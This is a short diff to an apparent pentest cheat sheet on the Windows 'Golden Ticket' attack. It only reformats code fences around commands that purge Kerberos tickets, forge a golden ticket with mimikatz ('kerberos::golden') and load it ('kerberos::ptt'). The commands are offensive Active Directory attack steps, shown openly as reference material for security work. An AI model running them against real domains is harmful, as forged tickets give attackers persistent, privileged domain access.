@@ -1,6 +1,8 @@
 # Windows - Golden Ticket
 
-```klist purge```
+```
+klist purge
+```
 
 Purge all ticket
 
@@ -17,7 +19,9 @@ mimikatz# kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /<cip
 
 Create Golden ticket
 
-```debug# kerberos::ptt <ticket_name>```
+```
+debug# kerberos::ptt <ticket_name>
+```
 
 Load Golden ticket
 
